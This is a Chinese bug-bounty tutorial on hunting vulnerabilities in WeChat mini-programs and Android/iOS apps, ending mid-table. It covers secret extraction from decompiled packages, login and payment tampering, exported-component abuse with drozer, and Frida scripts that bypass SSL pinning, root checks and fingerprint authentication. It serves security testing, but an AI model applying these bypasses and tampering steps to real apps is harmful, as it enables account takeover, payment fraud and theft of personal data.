#  APP漏洞挖掘六脉神剑：组件、存储、证书、生物、Root、动态加载  
原创 逍遥
                    逍遥  逍遥子讲安全   2026-02-26 03:40  
  
**一个反编译的wxapkg文件，可能藏着整个云服务的密钥；一个被Hook的指纹验证，可能让千万级用户认证形同虚设。**  
  
2025年，某SRC年度报告显示：移动端漏洞（小程序+APP）占所有提交漏洞的**43%**  
，但平均奖金比Web端高出**60%**  
。不是因为移动端更难，而是因为**大部分猎人的认知还停留在Web层面**  
，对小程序反编译、APP脱壳、客户端绕过一无所知。  
  
我见过最值钱的移动端漏洞，是一个被硬编码在wxapkg  
里的**阿里云AccessKey**  
——攻击者通过小程序反编译拿到密钥，直接接管了整个生产环境的OSS存储。**奖金：12,000元**  
。也见过最亏的，一个APP的**生物识别绕过**  
漏洞提交者只拿了2000元——他不知道这个漏洞可以组合成**任意用户登录+资金窃取**  
。  
  
本文将首次完整公开我的**小程序+APP双端深度狩猎体系**  
——从信息收集、逆向分析、协议抓包到业务逻辑漏洞挖掘，涵盖6大类核心手法、9个真实案例、全套武器库，全是干到拧不出水的干货。  
## 第一章 移动端攻击面的“三重维度”  
### 1.1 小程序 vs APP：攻击面的本质差异  
<table><thead><tr><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px 10px 0px;text-align: left;"><section><span leaf="">维度</span></section></th><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">微信/支付宝小程序</span></section></th><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">原生APP</span></section></th><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">混合应用（React Native/Flutter）</span></section></th></tr></thead><tbody><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><strong style="font-weight: 600;"><span leaf="">代码获取</span></strong></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">可直接反编译wxapkg</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">需脱壳、砸壳</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">JS bundle可直接提取</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><strong style="font-weight: 600;"><span leaf="">调试难度</span></strong></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">微信开发者工具可调试</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">需代理、证书配置</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">Chrome DevTools可调试</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><strong style="font-weight: 600;"><span leaf="">本地存储</span></strong></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">Storage、IndexedDB</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">SharedPreferences、Keychain</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">取决于框架实现</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><strong style="font-weight: 600;"><span leaf="">协议抓包</span></strong></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">HTTPS需配置证书</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">同左，部分有证书锁定</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">同左</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><strong style="font-weight: 600;"><span leaf="">关键风险点</span></strong></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">前端密钥硬编码、sessionkey泄露</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">组件暴露、动态注入、Root检测绕过</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">JS bundle泄露、bridge漏洞</span></section></td></tr></tbody></table>  
**核心认知**  
：移动端挖掘不是“Web测试的延伸”，而是一个全新的战场——**客户端不可信**  
是基本原则，**一切客户端逻辑都能被逆向和篡改**  
。  
### 1.2 小程序专属攻击面  
  
小程序运行在宿主APP（微信/支付宝/抖音等）的WebView中，但多了**原生能力调用**  
的通道：  
- **云开发环境**  
：直接集成云函数、云数据库，密钥常硬编码在前端  
  
- **用户登录态**  
：sessionkey  
、openid  
、unionid  
的传递与存储  
  
- **小程序码**  
：scene参数传递、扫码跳转逻辑  
  
- **插件机制**  
：第三方插件引入带来的供应链风险  
  
- **支付功能**  
：唤起支付参数可篡改  
  
### 1.3 APP专属攻击面  
  
APP拥有更底层的系统权限，攻击面更广：  
- **组件暴露**  
：Android的Activity/ContentProvider/Service导出  
  
- **本地存储**  
：数据库、SharedPreferences、Keychain中的敏感信息  
  
- **动态代码加载**  
：DEX加载、JNI调用、热更新机制  
  
- **证书锁定**  
：SSL Pinning绕过  
  
- **生物识别**  
：指纹/面容验证逻辑绕过  
  
- **Root/越狱检测**  
：检测逻辑可被Hook绕过  
  
## 第二章 信息收集：移动端资产测绘的“四步走”  
### 2.1 小程序信息收集：从搜索到反编译  
  
**第一步：批量发现目标小程序**  
  
使用wechat_app_search.py  
批量搜索关键词相关的小程序：  
```
bash
python wechat_app_search.py -k "目标公司名/业务关键词"
```  
  
  
该脚本可收集小程序的名称、AppID、描述、图标等基础信息。  
  
**第二步：获取小程序包（wxapkg）**  
  
微信小程序的代码包存储在手机本地路径：  
- Android：/data/data/com.tencent.mm/MicroMsg/[32位hash]/appbrand/pkg/  
  
- iOS：需越狱后访问对应沙盒目录  
  
**提取方法**  
：  
1. 手机root/越狱，直接复制wxapkg文件  
  
1. 使用备份工具提取  
  
1. 通过PC版微信的缓存目录获取（WeChat Files/Applet/  
）  
  
**第三步：反编译wxapkg**  
  
使用wechat_wxapkg_infoget.py  
从wxapkg中提取敏感信息：  
```
bash
python wechat_wxapkg_infoget.py -f target.wxapkg
```  
  
该工具内置多种匹配规则，可提取：  
- 手机号、身份证  
  
- JWT令牌  
  
- URL、IP、域名  
  
- API密钥  
  
- 用户名密码  
  
- 云服务密钥（AWS/Aliyun等）  
  
**实战案例**  
：某政务小程序反编译后，在config.js  
中发现硬编码的阿里云AccessKey，直接接管OSS存储桶，获取10万+用户身份证照片。**奖金：8,000元**  
。  
  
**第四步：域名关联分析**  
  
使用wechat_domains_search.py  
批量搜索小程序使用的域名：  
```
python wechat_domains_search.py -i target_appid
```  
  
分析域名可发现：  
- API接口地址  
  
- 云开发环境域名  
  
- 第三方服务调用  
  
### 2.2 APP信息收集：从APK/IPA到源码分析  
  
**Android端（APK）**  
：  
```
bash
# 1. 反编译
apktool d target.apk -o output/
# 2. 查看AndroidManifest.xml（组件暴露）
# 3. 查看classes.dex（可进一步反编译为Java）
dex2jar target.apk -o target.jar
jd-gui target.jar
```  
  
**iOS端（IPA）**  
：  
```
bash
# 1. 解压IPA
unzip target.ipa -d output/
# 2. 查看Mach-O二进制（需砸壳，越狱设备）
# 3. 查看资源文件中的plist配置
```  
  
**敏感信息自动化扫描**  
：  
```
bash
# MobSF - 移动安全框架
docker run -p 8000:8000 opensecurity/mobile-security-framework-mobsf
# 上传APK/IPA，自动扫描敏感信息、漏洞、权限等
```  
  
**重点关注**  
：  
- strings.xml  
、plist  
中的硬编码字符串  
  
- AndroidManifest.xml  
中的exported组件  
  
- build.gradle  
中引用的第三方库版本（是否存在已知漏洞）  
  
- local.properties  
中的SDK路径（可能泄露开发者信息）  
  
## 第三章 小程序漏洞挖掘的“七种武器”  
### 3.1 sessionkey泄露：一键登录任意账号  
  
**漏洞原理**  
：小程序登录流程中，前端通过wx.login()  
获取code，后端用code换取sessionkey  
和openid  
。若某个接口返回了sessionkey  
，攻击者可利用它伪造用户身份。  
  
**挖掘方法**  
：  
1. 拦截小程序登录、手机号一键登录等请求  
  
1. 关注返回包中的sessionkey  
、session_key  
、openid  
字段  
  
1. 用获取的sessionkey构造请求头：X-Wx-SessionKey: xxx  
或Cookie: session=xxx  
  
**实战案例**  
（来自CN-SEC投稿）：  
  
某旅游类小程序使用手机号一键登录功能。测试发现，一键登录接口的返回包中除了正常的登录态外，还包含明文的phoneNumber  
和purePhoneNumber  
。  
  
text  
```
{"phoneNumber":"182****1234", "purePhoneNumber":"18212341234"}
```  
  
攻击者拦截返回包，将这两个参数修改为目标的手机号（如166****5678  
），然后放包——**直接登录成功，无需验证码！**  
  
该漏洞可导致任意用户登录，攻击者可用他人账号查看订单、个人信息等。  
  
**进阶技巧**  
：sessionkey加密传输时，需分析前端解密逻辑（通常写在JS中）。将加密算法本地复现，即可伪造任意用户的session。  
### 3.2 云开发环境密钥泄露  
  
**漏洞原理**  
：小程序云开发使用wx.cloud.init()  
初始化，常硬编码env  
、traceUser  
等参数。若开发者误将secret  
也写入前端，可直接操作云数据库。  
  
**挖掘方法**  
：  
1. 反编译wxapkg，搜索cloud.init  
、env  
、secret  
关键词  
  
1. 找到云环境ID后，尝试用官方工具连接  
  
1. 若未配置安全规则，可直接读写数据库  
  
**实战案例**  
：某电商小程序反编译后，在app.js  
中发现：  
```
javascript
wx.cloud.init({
  env: 'prod-7g8h9j0k',
  traceUser: true,
  secret: 'f7d8g9h0j1k2l3'  // 硬编码的密钥！
});
```  
  
使用该密钥初始化云开发SDK，成功连接生产数据库，获取全部用户订单记录（含收货地址、手机号）。**奖金：5,000元**  
。  
### 3.3 小程序码scene参数注入  
  
**漏洞原理**  
：小程序码的scene参数用于传递自定义信息，常被用于用户标识、订单ID等。若scene参数未严格校验，可被篡改实现越权。  
  
**挖掘方法**  
：  
1. 生成小程序码，截取scene参数  
  
1. 修改scene值为其他用户ID/订单ID  
  
1. 扫码进入小程序，观察是否可越权访问他人数据  
  
**实战案例**  
：某点餐小程序，每个订单生成专属小程序码，scene中包含orderId  
。攻击者将orderId修改为其他用户的订单号，扫码进入后直接看到他人订单详情（含地址、电话）。**奖金：3,000元**  
。  
### 3.4 小程序WebView组件XSS  
  
**漏洞原理**  
：小程序使用web-view  
组件嵌入H5页面。若H5页面存在XSS，攻击者可利用它调用小程序原生能力（需配置jsapi  
）。  
  
**挖掘方法**  
：  
1. 遍历小程序页面，找到web-view  
组件  
  
1. 分析其src是否可控（如从URL参数读取）  
  
1. 尝试注入XSS payload，调用wx.miniProgram.navigateTo  
等接口  
  
**限制**  
：小程序限制了web-view  
可调用的API，但仍可能造成信息泄露。  
### 3.5 小程序支付参数篡改  
  
**漏洞原理**  
：小程序唤起支付时，参数由前端生成（或后端返回但前端参与签名）。若签名逻辑可绕过，可篡改支付金额。  
  
**挖掘方法**  
：  
1. 拦截下单接口，分析返回的支付参数  
  
1. 尝试修改total_fee  
、body  
等字段  
  
1. 若服务端未二次校验，可实现0.01元支付  
  
**实战案例**  
：某商城小程序下单时，前端计算total_fee  
并参与签名。攻击者Hook前端计算函数，将100元改为0.01元，成功支付。**奖金：6,000元**  
。  
## 第四章 APP漏洞挖掘的“六种武器”  
### 4.1 组件暴露：Android的“后门”  
  
**漏洞原理**  
：Android的Activity、ContentProvider、Service若设置exported=true  
，可被其他应用直接调用，绕过权限校验。  
  
**挖掘方法**  
：  
```
bash
# 从AndroidManifest.xml提取所有exported组件
grep -r "android:exported=\"true\"" AndroidManifest.xml
# 使用drozer测试组件暴露
run app.activity.info -a 包名
run app.activity.start --component 包名 Activity名
```  
  
**实战案例**  
：某银行APP的LoginActivity  
设置exported=true  
，且包含com.example.LOGIN  
自定义action。攻击者编写恶意APP，发送隐式意图直接拉起登录页——但这只是开始。更严重的是，该APP的FileProvider  
也导出，攻击者可读取内部存储文件。**奖金：4,000元**  
。  
### 4.2 本地存储敏感信息泄露  
  
**Android端检查**  
：  
```
bash
# 查看SharedPreferences
adb shell run-as 包名 cat /data/data/包名/shared_prefs/*.xml
# 查看数据库
adb shell run-as 包名 sqlite3 /data/data/包名/databases/数据库.db
# 查看外部存储
adb shell ls /sdcard/Android/data/包名/
```  
  
**iOS端检查**  
（需越狱）：  
```
bash
# 查看plist文件
plutil -p /var/mobile/Containers/Data/Application/包名/Library/Preferences/*.plist
# 查看Keychain
# 需使用Keychain-dumper工具
```  
  
**常见问题**  
：  
- 明文存储登录令牌  
  
- 缓存用户身份证照片  
  
- 保存支付密码（罕见但存在）  
  
### 4.3 证书锁定绕过  
  
**漏洞原理**  
：APP使用SSL Pinning固定证书或公钥，防止中间人攻击。但若实现不当，可通过Hook绕过。  
  
**绕过方法**  
：  
```
bash
# 使用Frida脚本绕过证书锁定
frida -U -l frida-android-repinning.js -f 包名
# 使用JustTrustMe（Xposed模块）
# 安装Xposed框架和JustTrustMe模块
```  
  
**工具推荐**  
：  
- **Objection**  
：基于Frida的运行时移动探索工具  
  
- **Inspeckage**  
：动态分析Android应用的工具  
  
### 4.4 生物识别绕过  
  
**最新漏洞案例**  
：cap-go/capacitor-native-biometric  
库的认证绕过（CVE暂无，GHSA-VX5F-VMR6-32WF）  
  
**漏洞原理**  
：该库在处理指纹认证时，onAuthenticationSucceeded()  
方法未验证CryptoObject  
，攻击者可直接Hook该方法伪造认证成功。  
```
java
@Override
public void onAuthenticationSucceeded(
    @NonNull BiometricPrompt.AuthenticationResult result
) {
    super.onAuthenticationSucceeded(result);
    finishActivity("success");
}
```  
  
**利用方法**  
（Frida脚本）  
：  
```
javascript
Java.perform(function () {
    hookBiometricPrompt();
});
function hookBiometricPrompt() {
    var biometricPrompt = Java.use('android.hardware.biometrics.BiometricPrompt')['authenticate'].overload(
        'android.os.CancellationSignal', 
        'java.util.concurrent.Executor', 
        'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback'
    );
    biometricPrompt.implementation = function (cancellationSignal, executor, callback) {
        var authenticationResultInst = getBiometricPromptResult();
        callback.onAuthenticationSucceeded(authenticationResultInst);
    }
}
```  
  
**后果**  
：任何使用该库的APP的指纹认证均可被绕过，攻击者无需指纹即可登录。  
### 4.5 Root/越狱检测绕过  
  
**挖掘思路**  
：APP通常会在启动时检查设备是否Root/越狱，若检测到则退出或限制功能。攻击者可Hook检测函数，强制返回false。  
  
**常用Hook点**  
：  
- Android：RootBeer  
、Su  
检测、build.TAGS  
检测  
  
- iOS：Cydia  
、apt  
检测、fork()  
检测  
  
**Frida绕过示例**  
：  
```
javascript
Java.perform(function() {
    var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
    RootBeer.isRooted.implementation = function() {
        return false;
    };
});
```  
### 4.6 动态代码加载漏洞  
  
**漏洞原理**  
：APP动态下载DEX/JAR文件并加载执行。若下载过程未校验完整性（如HTTPS降级、未校验签名），攻击者可替换恶意代码。  
  
**挖掘方法**  
：  
1. 抓包分析APP启动后的网络请求  
  
1. 寻找动态下载的dex/jar/so文件  
  
1. 分析下载链接是否使用HTTPS、是否校验签名  
  
1. 尝试中间人攻击替换文件  
  
## 第五章 移动端抓包与动态调试技巧  
### 5.1 小程序抓包配置  
  
**Android端**  
：  
1. 手机设置代理指向Burp（IP:8080）  
  
1. 安装Burp CA证书  
  
1. 微信7.0以上需将证书移动至系统证书目录（需root）  
  
**iOS端**  
：  
1. 设置代理  
  
1. 安装证书并信任（设置→通用→关于本机→证书信任设置）  
  
**微信小程序专用抓包**  
：  
- **Proxifier**  
：全局代理，可抓PC版微信小程序  
  
- **whistle**  
：支持小程序WebSocket抓包  
  
### 5.2 APP抓包与证书锁定绕过  
  
**通用方案**  
：  
1. 安装Burp证书  
  
1. 使用VirtualXposed+JustTrustMe绕过证书锁定  
  
1. 或使用Objection一键绕过  
  
```
bash
# Objection绕过证书锁定
objection -g 包名 explore
android sslpinning disable
```  
### 5.3 动态调试工具链  
<table><thead><tr><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px 10px 0px;text-align: left;"><section><span leaf="">工具</span></section></th><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">用途</span></section></th><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">适用平台</span></section></th></tr></thead><tbody><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><strong style="font-weight: 600;"><span leaf="">Frida</span></strong></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">动态Hook、函数跟踪</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">Android/iOS</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><strong style="font-weight: 600;"><span leaf="">Objection</span></strong></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">基于Frida的探索工具</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">Android/iOS</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><strong style="font-weight: 600;"><span leaf="">Xposed</span></strong></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">全局Hook模块</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">Android</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><strong style="font-weight: 600;"><span leaf="">Cycript</span></strong></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">iOS运行时分析</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span 